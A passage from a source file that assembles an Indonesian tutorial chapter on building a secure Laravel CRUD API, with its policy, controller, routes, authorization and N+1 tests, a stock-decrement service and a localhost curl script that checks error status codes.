            public function delete(User $user, Catatan $catatan): bool
            {
                return $catatan->penulis_id === $user->id;
            }
        }
        `,
        { filename: 'app/Policies/CatatanPolicy.php' },
      ),
      p(
        'Ketiga method berisi perbandingan yang sama persis, dan itu wajar karena aturan kepemilikannya memang satu, yaitu `penulis_id` harus sama dengan id pengguna yang meminta. Nilainya bukan pada kerumitan melainkan pada **letaknya**, sebab aturan itu tertulis di satu berkas, bukan tersebar sebagai `if` di lima method controller yang masing-masing bisa salah tulis. Ketika nanti admin boleh melihat semuanya, satu method `before()` di kelas ini mengubah perilaku seluruh aplikasi.',
      ),
      p(
        'Perhatikan nama method-nya, yaitu `view`, `update`, dan `delete`, cocok dengan argumen pertama `$this->authorize(...)` di controller. Pencocokan itu berdasarkan nama, jadi salah ketik `updated` alih-alih `update` akan membuat Laravel mengeluh policy-nya tidak ada, bukan diam-diam meloloskan. Laravel 11 ke atas juga menemukan kelas ini otomatis dari konvensi penamaannya (`Catatan` → `CatatanPolicy`), sehingga tidak ada pendaftaran manual yang perlu ditulis.',
      ),

      h2('Controller'),
      code(
        'php',
        `
        final class CatatanController extends Controller
        {
            public function index(Request $request): AnonymousResourceCollection
            {
                $perHalaman = min((int) $request->query('per_page', 20), 100);

                $catatan = Catatan::query()
                    ->where('penulis_id', $request->user()->id)   // scope ke pemilik
                    ->with('penulis:id,name')                     // cegah N+1
                    ->withCount('komentar')
                    ->latest('created_at')
                    ->orderByDesc('id')                           // pemecah seri
                    ->paginate($perHalaman);

                return CatatanResource::collection($catatan);
            }

            public function store(SimpanCatatanRequest $request): JsonResponse
            {
                $catatan = $request->user()->catatan()->create($request->validated());

                return (new CatatanResource($catatan))
                    ->response()
                    ->setStatusCode(201)
                    ->header('Location', route('catatan.show', $catatan));
            }

            public function show(Catatan $catatan): CatatanResource
            {
                // Tanpa baris ini: IDOR.
                $this->authorize('view', $catatan);

                return new CatatanResource($catatan->load('penulis:id,name'));
            }

            public function update(SimpanCatatanRequest $request, Catatan $catatan): CatatanResource
            {
                $this->authorize('update', $catatan);
                $catatan->update($request->validated());

                return new CatatanResource($catatan);
            }

            public function destroy(Catatan $catatan): Response
            {
                $this->authorize('delete', $catatan);
                $catatan->delete();

                return response()->noContent();
            }
        }
        `,
      ),
      p(
        "Method `index` merangkum hampir seluruh bab ini dalam satu rangkaian. `where('penulis_id', ...)` menjaga kepemilikan di lapisan data — bukan Policy, karena Policy bekerja per objek dan endpoint daftar tidak memanggilnya per baris. `with('penulis:id,name')` mencegah N+1 sekaligus membatasi kolom yang diambil, dengan `id` yang wajib ikut. `withCount('komentar')` mengambil jumlahnya lewat subquery tanpa memuat satu komentar pun. Dan `orderByDesc('id')` setelah `latest('created_at')` adalah pemecah seri dari sub-bab 2.4, yang mencegah item muncul dua kali antar halaman.",
      ),
      p(
        'Perhatikan pembagian tugas antara `index` dan tiga method di bawahnya. Yang pertama memakai **scope query**, sisanya memakai `$this->authorize(...)` karena route model binding sudah terlanjur mengambil objeknya, dan tanpa baris itu komentar "Tanpa baris ini: IDOR" pada `show` berlaku harfiah. Perhatikan juga `$catatan->load(\'penulis:id,name\')` di `show`, sebab `load` adalah versi `with` untuk model yang **sudah** diambil, dan tanpa itu `whenLoaded` di Resource akan diam sehingga field penulisnya hilang dari respons.',
      ),
      p(
        "Batas `min((int) ..., 100)` pada `per_page` menutup satu permintaan yang bisa menjatuhkan server, dan status yang dikembalikan mengikuti kontrak di awal: `201` beserta header `Location` yang disusun `route('catatan.show', $catatan)` alih-alih dirangkai sebagai string, dan `noContent()` yang berarti `204` tanpa body.",
      ),

      h2('Rute'),
      code(
        'php',
        `
        // routes/api.php
        Route::middleware(['auth:sanctum', 'throttle:100,1'])->group(function () {
            Route::apiResource('catatan', CatatanController::class);
        });
        `,
      ),
      p(
        'Tiga baris ini menghasilkan lima endpoint yang seluruhnya terjaga. `auth:sanctum` menolak permintaan tanpa token yang sah, dan `throttle:100,1` membatasi seratus permintaan per menit per pemanggil — padanan `express-rate-limit` dari Bab 3, hanya sudah tersedia bawaan. Perhatikan keduanya dipasang pada **grup**, sehingga endpoint baru yang ditambahkan ke dalamnya otomatis ikut terlindungi: bentuk konkret prinsip "default tolak" dari sub-bab 5.1.',
      ),
      p(
        'Setelah menulis ini, jalankan `php artisan route:list --path=catatan` dan periksa kolom middleware-nya. Kelima baris harus menampilkan `auth:sanctum` dan `throttle`; baris yang kolomnya kosong berarti rutenya jatuh di luar grup dan terbuka untuk siapa saja.',
      ),

      h2('Tes yang membuktikan otorisasinya bekerja'),
      code(
        'php',
        `
        it('menolak akses ke catatan milik pengguna lain', function () {
            $ana = User::factory()->create();
            $budi = User::factory()->create();

            $catatanBudi = Catatan::factory()->create(['penulis_id' => $budi->id]);

            $this->actingAs($ana)
                ->getJson("/api/catatan/{$catatanBudi->id}")
                ->assertForbidden();          // 403 dari Policy

            $this->actingAs($ana)
                ->patchJson("/api/catatan/{$catatanBudi->id}", ['judul' => 'dibajak'])
                ->assertForbidden();

            $this->actingAs($ana)
                ->deleteJson("/api/catatan/{$catatanBudi->id}")
                ->assertForbidden();

            // Pastikan datanya benar-benar tidak berubah
            expect($catatanBudi->fresh()->judul)->not->toBe('dibajak');
        });

        it('menolak field yang tidak divalidasi masuk ke database', function () {
            $ana = User::factory()->create();
            $budi = User::factory()->create();

            $this->actingAs($ana)->postJson('/api/catatan', [
                'judul' => 'Catatan',
                'isi' => 'Isi',
                'penulis_id' => $budi->id,     // percobaan mass assignment
            ])->assertCreated();

            // penulis_id HARUS tetap ana, bukan budi
            expect(Catatan::first()->penulis_id)->toBe($ana->id);
        });

        it('tidak menjalankan query N+1 pada daftar', function () {
            $ana = User::factory()->create();
            Catatan::factory()->count(20)->create(['penulis_id' => $ana->id]);

            DB::enableQueryLog();
            $this->actingAs($ana)->getJson('/api/catatan')->assertOk();

            // Jumlahnya harus tetap kecil, tidak tumbuh mengikuti jumlah baris
            expect(count(DB::getQueryLog()))->toBeLessThan(6);
        });
        `,
      ),
      p(
        'Ketiga tes ini punya satu kesamaan, yaitu semuanya membuktikan sesuatu **tidak** terjadi. Tes pertama memakai dua pengguna, dengan catatan milik Budi dan permintaan atas nama Ana lewat `actingAs($ana)`, dan itulah yang tidak akan pernah kamu lakukan saat menguji manual dengan akunmu sendiri. Perhatikan baris terakhirnya memanggil `fresh()` untuk membaca ulang dari database, sebab status `403` saja belum membuktikan apa-apa kalau ternyata datanya sempat berubah sebelum ditolak.',
      ),
      p(
        'Tes kedua menembakkan `penulis_id` milik Budi ke endpoint pembuatan, lalu memastikan hasilnya tetap tercatat atas nama Ana. Perhatikan yang diharapkan adalah `assertCreated()` — permintaannya memang **berhasil**, hanya field asingnya yang diabaikan. Inilah yang membuktikan rangkaian `validated()` + `$fillable` + pembuatan lewat relasi benar-benar bekerja; hapus salah satunya dan tes ini langsung merah.',
      ),
      p(
        "Tes ketiga menjadikan N+1 sesuatu yang bisa **diuji**, bukan sekadar diingat. `DB::enableQueryLog()` mencatat setiap query yang dijalankan, dan ambang `toBeLessThan(6)` berlaku untuk 20 catatan — angka itu tidak boleh tumbuh mengikuti jumlah baris. Kalau seseorang nanti menghapus `with('penulis:id,name')` dari controller, jumlah query melonjak menjadi lebih dari dua puluh dan tes ini gagal seketika, jauh sebelum masalahnya sampai ke pengguna.",
      ),
      callout(
        'danger',
        'Tes kedua adalah yang paling sering tidak ditulis',
        'Ia tidak menguji bahwa fitur berjalan — ia menguji bahwa sesuatu yang **seharusnya tidak bisa** memang tidak bisa. Tanpa `$fillable` yang benar dan `validated()`, tes itu gagal dan catatan tercatat atas nama orang lain. Ini penerapan langsung dari "uji jalur yang tidak bahagia".',
      ),

      h2('Membandingkan dengan versi Express'),
      table(
        ['Kebutuhan', 'Express (Bab 3)', 'Laravel'],
        [
          ['Validasi', 'Zod + middleware buatan sendiri', 'Form Request'],
          ['Otorisasi', 'Cek manual di service + scope query', 'Policy + scope query'],
          ['Bentuk respons', 'Pilih kolom manual', 'API Resource'],
          ['Paginasi', 'Hitung `LIMIT`/`OFFSET` sendiri', '`paginate()`'],
          ['Rate limit', '`express-rate-limit`', 'Middleware `throttle`'],
          ['Penanganan error', 'Middleware error buatan sendiri', 'Bawaan + `bootstrap/app.php`'],
        ],
      ),
      p(
        'Kolom kanan lebih pendek karena Laravel menyediakannya. Yang **tidak** berubah adalah kolom kiri: setiap kebutuhan itu tetap ada, dan setiap pemeriksaan keamanan tetap harus kamu tulis sadar. Framework menghemat perakitan, bukan penilaian.',
      ),

      divider,

      checklist(
        'bb4-praktik',
        'Checklist praktik bab ini',
        'Setiap berkas PHP diawali `declare(strict_types=1)`',
        'Setiap method controller yang menerima model memanggil `$this->authorize(...)`',
        "Query daftar di-scope dengan `where('penulis_id', $request->user()->id)`",
        '`$fillable` didaftarkan eksplisit; tidak ada `$guarded = []` di mana pun',
        'Controller memakai `validated()`, bukan `all()` atau `input()`',
        'Respons memakai API Resource; tidak ada model yang dikembalikan mentah',
        '`whenLoaded` dipakai untuk relasi di Resource',
        '`Model::preventLazyLoading()` aktif di luar produksi',
        '`config()` dipakai di luar folder `config/`, bukan `env()`',
        'Migration punya `down()` yang sudah benar-benar diuji dengan rollback',
        'Tes membuktikan pengguna lain menerima 403, dan datanya tidak berubah',
        'Tes membuktikan `penulis_id` dari body diabaikan',
        'Tes menghitung jumlah query untuk membuktikan tidak ada N+1',
        'Document root diarahkan ke `public/`, dan `.env` tidak bisa diakses lewat web',
      ),

      h2('Studi kasus di project nyata'),
      p(
        'CRUD Laravel yang siap dipakai berbeda dari CRUD latihan pada hal-hal yang tidak terlihat di jalur sukses, dan seluruhnya sudah diukur sepanjang dua bab terakhir. Berikut kedelapannya bertemu dalam satu sumber daya.',
      ),
      code(
        'php',
        `
        <?php
        declare(strict_types=1);

        final class PesananController extends Controller
        {
            public function __construct(private readonly LayananPesanan $layanan)
            {
                // Otorisasi terpasang untuk SELURUH method sekaligus,
                // jadi method baru tidak bisa lupa dipasangi.
                $this->authorizeResource(Pesanan::class, 'pesanan');
            }

            // 1. DAFTAR — relasi dimuat di depan, paginasi dibatasi.
            public function index(Request $request)
            {
                $limit = min((int) $request->integer('limit', 20), 100);   // batas ATAS wajib

                $pesanan = Pesanan::query()
                    ->where('pelanggan_id', $request->user()->id)   // batas di QUERY, bukan sesudahnya
                    ->with('pelanggan')                             // menutup N+1
                    ->withCount('item')                             // tanpa memuat ribuan baris item
                    ->latest('id')                                  // pengurut UNIK, bukan created_at saja
                    ->cursorPaginate($limit);                       // keyset, bukan OFFSET

                return PesananResource::collection($pesanan);
            }

            // 2. BUAT — 201 beserta Location.
            public function store(BuatPesananRequest $request)
            {
                $pesanan = $this->layanan->buat(
                    pelangganId: $request->user()->id,
                    data: $request->validated(),      // hasil VALIDASI, bukan ->all()
                );

                return PesananResource::make($pesanan)
                    ->response()
                    ->setStatusCode(201)
                    ->header('Location', route('pesanan.show', $pesanan));
            }

            // 3. UBAH SEBAGIAN — PATCH, bukan PUT.
            public function update(UbahPesananRequest $request, Pesanan $pesanan)
            {
                return PesananResource::make(
                    $this->layanan->ubah($pesanan, $request->validated()),
                );
            }

            // 4. HAPUS — idempoten: 204 pada percobaan kedua juga.
            public function destroy(Pesanan $pesanan)
            {
                $this->layanan->hapus($pesanan);
                return response()->noContent();
            }
        }
        `,
        {
          caption:
            'Tidak ada satu pun try/catch: seluruh error dilempar dan ditangani di exception handler.',
        },
      ),
      p(
        "Setiap baris bertanda di atas menjawab sesuatu yang sudah diukur. `cursorPaginate` dipakai karena `OFFSET 250000` terbukti membaca 250.020 baris untuk memberi dua puluh, sedangkan keyset membaca dua puluh. `latest('id')` memakai kolom unik karena pengurut yang bisa seri terbukti membuat satu baris tidak pernah muncul di halaman mana pun. `with` dan `withCount` menutup N+1 yang terukur 53 milidetik melawan 3 milidetik. Dan batas atas pada `limit` menutup permintaan yang memaksa server membaca sejuta baris.",
      ),
      p(
        'Aturan bisnisnya sendiri tinggal di service, dan di sanalah transaksi serta pengurangan stok yang aman berada.',
      ),
      code(
        'php',
        `
        final class LayananPesanan
        {
            public function buat(int $pelangganId, array $data): Pesanan
            {
                return DB::transaction(function () use ($pelangganId, $data) {
                    // Pemeriksaan DAN pengurangan dalam SATU perintah.
                    // Diukur di bab database: pola baca-hitung-tulis menyisakan
                    // saldo 90 dari seharusnya 80 ketika dua proses berjalan bersamaan.
                    $berkurang = Produk::where('id', $data['produk_id'])
                        ->where('stok', '>=', $data['jumlah'])
                        ->decrement('stok', $data['jumlah']);

                    if ($berkurang === 0) throw new StokKurang($data['produk_id']);

                    $produk = Produk::findOrFail($data['produk_id']);

                    return Pesanan::create([
                        'pelanggan_id' => $pelangganId,
                        'produk_id' => $produk->id,
                        'jumlah' => $data['jumlah'],
                        // Harga DISALIN saat transaksi. Tanpa ini, menaikkan harga
                        // produk mengubah nilai seluruh pesanan lama.
                        'harga_satuan' => $produk->harga,
                        'total' => Diskon::total($produk->harga, $data['jumlah']),
                    ]);
                });
                // Pengiriman surel SENGAJA di luar transaksi: memanggil layanan
                // luar di dalamnya menahan kunci selama menunggu jaringan.
            }
        }
        `,
        {
          caption:
            'decrement mengembalikan jumlah baris yang berubah — nol berarti stoknya tidak cukup.',
        },
      ),

      h2('Saat error-nya muncul'),
      p(
        'Yang memisahkan CRUD siap pakai dari CRUD latihan adalah jalur yang tidak nyaman, dan seluruhnya bisa diuji dalam satu berkas perintah.',
      ),
      code(
        'text',
        `
        #!/bin/bash
        # uji-crud.sh — jalankan sebelum menyatakan endpoint selesai.
        A=http://localhost:8000/api/v1/pesanan
        H="Content-Type: application/json"
        J="Accept: application/json"          # <-- TANPA ini, Laravel MENGALIHKAN
        T="Authorization: Bearer $TOKEN"

        p() { printf '%-36s %s\\n' "$1" "$(curl -s -o /dev/null -w '%{http_code}' "\${@:2}")"; }

        p "buat, valid            (201)" -X POST   "$A" -H "$H" -H "$J" -H "$T" -d '{"produk_id":1,"jumlah":2}'
        p "buat, jumlah 0         (422)" -X POST   "$A" -H "$H" -H "$J" -H "$T" -d '{"produk_id":1,"jumlah":0}'
        p "buat, produk tak ada   (422)" -X POST   "$A" -H "$H" -H "$J" -H "$T" -d '{"produk_id":999999,"jumlah":1}'
        p "buat, JSON rusak       (400)" -X POST   "$A" -H "$H" -H "$J" -H "$T" -d '{produk_id:1}'
        p "buat, tanpa token      (401)" -X POST   "$A" -H "$H" -H "$J"        -d '{"produk_id":1,"jumlah":1}'
        p "buat, stok kurang      (409)" -X POST   "$A" -H "$H" -H "$J" -H "$T" -d '{"produk_id":1,"jumlah":99999}'
        p "buat, field asing      (201)" -X POST   "$A" -H "$H" -H "$J" -H "$T" -d '{"produk_id":1,"jumlah":1,"total":1}'
        p "ambil, id bukan angka  (404)" -X GET    "$A/abc" -H "$J" -H "$T"
        p "ambil, MILIK ORANG     (404)" -X GET    "$A/4211" -H "$J" -H "$T"
        p "hapus pertama          (204)" -X DELETE "$A/1" -H "$J" -H "$T"
        p "hapus kedua            (204)" -X DELETE "$A/1" -H "$J" -H "$T"
        p "limit berlebihan       (200)" -X GET    "$A?limit=1000000" -H "$J" -H "$T"
        `,
        {
          caption:
            'Header Accept: application/json itu wajib — tanpanya Laravel menjawab 302, bukan 422.',
        },
      ),
      p(
        'Tiga baris di daftar itu perlu penjelasan karena hasilnya mudah salah dibaca. Baris "field asing" memang **201**, dan yang membuktikan perlindungannya bekerja bukan status codenya melainkan bahwa `total` yang dikirim klien tidak tersimpan. Baris "milik orang" harus **404**, bukan 403, sebab 403 mengakui bahwa pesanan bernomor itu ada. Dan baris "limit berlebihan" memang **200**, yang harus diperiksa adalah jumlah baris yang kembali tetap dibatasi seratus.',
      ),
      p('Baris "hapus kedua" menguji idempotensi, dan itu yang paling sering salah ditulis.'),
      code(
        'text',
        `
        Diukur di bab database dan bab Fondasi:

          DELETE pertama  -> 204
          DELETE kedua    -> 204     <- keadaan yang diminta SUDAH tercapai

        Menjawab 404 pada percobaan kedua merusak idempotensi, dan akibatnya
        nyata: pustaka yang mencoba ulang otomatis saat jaringan gagal akan
        melaporkan kegagalan padahal penghapusannya berhasil.
        `,
      ),
      p(
        'Terakhir, satu kelas kegagalan yang hanya muncul di produksi dan sudah ditemui sendiri saat menyusun materi ini, yaitu **kegagalan yang penyebabnya bukan kode**.',
      ),
      code(
        'text',
        `
        Saat menyusun bab ini, build project ini sendiri gagal:

          Failed to build /kelas/... (attempt 1 of 3) because it took more
          than 60 seconds. Retrying again shortly.

        Dugaan pertama: isinya terlalu berat. Diukur, dan SALAH —
        seluruh highlighting 427 halaman memakan 5.785 ms, dan halaman
        yang timeout 60 DETIK hanya butuh 30 MILIDETIK.

        Penyebab sebenarnya: 3 proses build berebut ~1,1 GB memori tersisa
        di mesin tanpa swap. Dengan 1 proses: 506 halaman dalam 15,9 detik.

        Pelajarannya: sebelum memperbaiki kode, ukur dulu apakah kodenya
        yang bersalah.
        `,
        {
          caption: 'Ditelusuri sungguhan saat menyusun bab ini, memakai disiplin diagnose project.',
        },
      ),

      h2('Kesalahan umum pemula'),
      p(
        'CRUD adalah pekerjaan yang paling sering dinyatakan selesai terlalu cepat, sebab jalur suksesnya memang cepat selesai dan terlihat meyakinkan.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Menyatakan selesai setelah jalur sukses berjalan',
            'Fiturnya sudah bekerja',
            'Jalur 400, 401, 404, 409, dan 422 justru yang paling sering rusak di produksi',
          ],
          [
            'Memakai route model binding tanpa membatasi pemilik',
            '404-nya sudah otomatis',
            'Laravel memeriksa keberadaan, bukan kewenangan. Itu IDOR — batasi di query',
          ],
          [
            'Memakai `paginate()` untuk daftar yang bisa sangat panjang',
            'Itu cara paginasi yang biasa',
            'Diukur, `OFFSET 250000` membaca 250.020 baris untuk memberi 20. Pakai `cursorPaginate`',
          ],
          [
            'Mengurutkan hanya dengan `created_at`',
            'Itu urutan yang diinginkan',
            'Waktu bisa sama persis pada impor massal, dan diuji sungguhan, satu baris jadi tidak pernah muncul',
          ],
          [
            'Mengurangi stok dengan membaca lalu menyimpan',
            'Lebih mudah dibaca',
            'Diukur, dua proses bersamaan membuat satu pengurangan hilang. Pakai `decrement` dengan syarat',
          ],
          [
            'Menguji API tanpa header `Accept: application/json`',
            'Endpointnya kan API',
            'Laravel menjawab 302 alih-alih 422, dan itu terlihat seperti "endpoint tidak merespons"',
          ],
        ],
      ),
      p(
        'Baris pertama pantas menjadi penutup kategori ini. Sebuah endpoint dinyatakan selesai bukan ketika ia mengembalikan data yang benar, melainkan ketika setiap jalur kegagalannya sudah dijalankan sekali dan menghasilkan status serta pesan yang memang dirancang. Berkas `uji-crud.sh` di atas menutup seluruhnya dalam beberapa detik, dan ia tetap berguna berbulan-bulan kemudian ketika seseorang mengubah sesuatu dan ingin tahu apakah ada yang rusak.',
      ),
      references(
        {
          label: 'Laravel Sanctum',
          href: 'https://laravel.com/docs/12.x/sanctum',
          source: 'Laravel',
          note: 'Autentikasi token untuk API, beserta perintah `install:api`.',
        },
        {
          label: 'Authorization — Policies',
          href: 'https://laravel.com/docs/12.x/authorization#creating-policies',
          source: 'Laravel',
          note: 'Nama metode policy dan bagaimana Laravel memetakannya ke aksi.',
        },
        {
          label: 'HTTP Tests',
          href: 'https://laravel.com/docs/12.x/http-tests',
          source: 'Laravel',
          note: 'Assertion yang dipakai membuktikan otorisasi menolak pengguna lain.',
        },
        {
          label: 'REST Security Cheat Sheet',
          href: 'https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html',
          source: 'OWASP',
          note: 'Checklist keamanan API yang berlaku sama untuk Laravel maupun Express.',
        },
      ),
    ],
  ),
];
